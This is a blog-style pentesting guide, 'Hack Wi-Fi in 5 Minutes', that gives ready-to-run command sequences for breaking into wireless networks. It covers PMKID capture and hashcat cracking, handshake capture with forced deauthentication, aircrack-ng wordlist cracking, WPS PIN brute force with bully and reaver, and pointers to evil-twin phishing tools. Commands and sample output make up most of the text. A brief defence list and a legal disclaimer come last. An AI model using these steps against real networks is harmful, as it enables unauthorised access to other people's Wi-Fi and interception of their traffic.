---
title: "Hack Wi-Fi in 5 Minutes: WPA/WPA2/WPS Hacks"
description: >-
  No fluff. This is how real hackers break into most Wi-Fi networks in under 5 minutes. PMKID snatching, handshake cracking, WPS brute force, and real-world field tricks.
author:
name:
date: 2025-03-9 14:00:00 +0000
categories: [Pentesting]
tags: [wifi, aircrack, wpa, wps, pmkid, hacking, network]
---

> “Weak passwords + WPS or PMKID = Wi-Fi owned in 5 minutes.”
{: .prompt-info }

---

## Requirements

- Kali Linux / Parrot OS / BlackArch
- Wireless adapter that supports monitor mode and packet injection
- Tools: `airmon-ng`, `airodump-ng`, `aireplay-ng`, `aircrack-ng`, `bully`, `reaver`, `hcxdumptool`, `hcxpcapngtool`, `hashcat`

---

## Option 1: PMKID Attack (No Clients Required)

```bash
sudo airmon-ng check kill
sudo airmon-ng start wlan0
sudo hcxdumptool -i wlan0mon -o dump.pcapng --enable_status=1
```

Wait ~30 seconds to capture PMKID (no need to deauth anyone).

Convert the capture:
```bash
hcxpcapngtool -o hash.hc22000 dump.pcapng
```

Crack it:
```bash
hashcat -m 22000 hash.hc22000 /usr/share/wordlists/rockyou.txt
```

---

## Option 2: WPA2 Handshake Capture + Crack

### 1. Enable monitor mode
```bash
sudo airmon-ng check kill
sudo airmon-ng start wlan0
```

### 2. Scan for targets
```bash
airodump-ng wlan0mon
```

### 3. Capture handshake
```bash
airodump-ng -c <CH> --bssid <BSSID> -w handshake wlan0mon
```

### 4. Force deauthentication
```bash
aireplay-ng -0 5 -a <BSSID> -c <ClientMAC> wlan0mon
```

> `"Wait for "WPA Handshake" message to confirm capture."`{: .filepath}


### 5. Crack the handshake
```bash
aircrack-ng handshake.cap -w /usr/share/wordlists/rockyou.txt
```

> Use smarter wordlists from `cupp`, `pyrrate`, or custom `crunch`.
{: .prompt-tip }

---

## Option 3: WPS PIN Bruteforce

Try this if WPS is enabled. It's usually faster than handshake cracking.

### Bully (faster):
```bash
bully wlan0mon -b <BSSID> -c <CH>
```

### Reaver (slower fallback):
```bash
reaver -i wlan0mon -b <BSSID> -vv
```

Successful output gives:
```
[+] WPS PIN: 12345670
[+] WPA PSK: supersecretwifi123
```

---

## Bonus: Wi-Fi Password Spraying with Wifite

```bash
wifite
```

- Automates WPS/PMKID/Handshake attacks
- Use with custom rules and timeouts:
```bash
wifite --dict /path/to/wordlist.txt
```

---

## Defend Against These Attacks

- Disable WPS permanently
- Use WPA3 or WPA2 with 802.11w (PMF enabled)
- Use a secure password (16+ characters, symbols, random)
- Monitor wireless traffic with IDS/IPS tools like `Kismet`

---

## Legal Notice

> This guide is for educational and authorized penetration testing only. Unauthorized Wi-Fi hacking is illegal and unethical.
{: .prompt-warning }

---

## Speedrun Summary

| Attack Type         | Time     | Success Rate |
|---------------------|----------|---------------|
| PMKID Attack        | 1–2 min  | High          |
| WPA2 Handshake      | 3–4 min  | Medium–High   |
| WPS Bruteforce      | 1–5 min  | Very High     |
| Wordlist Cracking   | Varies   | Depends on pass strength |

---

## Next-Level Wireless Hacking (Advanced Ops)

- Rogue APs with `airgeddon` or `eaphammer`
- Evil twin + captive portal phishing with `wifiphisher`
- Use `hostapd` to clone SSIDs and trap clients
- Fake enterprise Wi-Fi with `hostapd-wpe`
- Crack EAP/MSCHAPv2 creds with `asleap`

---

## Lab Ideas

- Set up Wi-Fi attack VMs
- Use Raspberry Pi as a covert hacking station
- Practice using `WiFi Pumpkin 3` or `Fluxion`
- Capture real traffic from multiple clients using `hcxdumptool`

---

> **`“You don’t need to be the fastest. You just need to be near the signal.”`**{: .filepath}
